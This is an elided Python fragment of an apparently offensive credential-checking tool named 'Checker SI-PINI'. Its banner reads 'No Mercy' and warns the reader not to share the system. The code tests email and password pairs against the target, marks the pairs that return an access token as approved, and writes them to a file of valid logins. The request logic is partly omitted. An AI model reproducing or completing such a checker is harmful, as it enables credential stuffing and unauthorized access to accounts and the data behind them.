...
print(f"""
                 ...
                 {Fore.CYAN}                       No Mercy. 
                 {Fore.WHITE} 
                 {Fore.CYAN}                   @descriptografado 
 
                 {Fore.WHITE}    ╔═══════════════════════════════════════════════╗  
                 {Fore.WHITE}    ║              {Fore.CYAN}Checker SI-PINI {Fore.WHITE}                 ║
                 {Fore.WHITE}    ║        {Fore.CYAN}Não compartilhe esse sistema!       {Fore.WHITE}   ║
                 {Fore.WHITE}    ╚═══════════════════════════════════════════════╝
                 {Fore.WHITE}
                 {Fore.WHITE}        ╔════════════════════════════════════════╗
                 {Fore.WHITE}        ║    {Fore.CYAN}Conexão com o SI-PINI Realizada{Fore.WHITE}     ║
                 {Fore.WHITE}        ╚════════════════════════════════════════╝
""")
...
with open('logins_aprovados.txt', 'a') as log_file:
    for line in lines:
        ...
        if '"accessToken"' in fim:
            print(Fore.GREEN + f"Aprovado | {email} | {senha}")
            data = json.loads(fim)
            ...
            print(Fore.RED + "Usuário e senha SCPA não autorizados")
            print("")
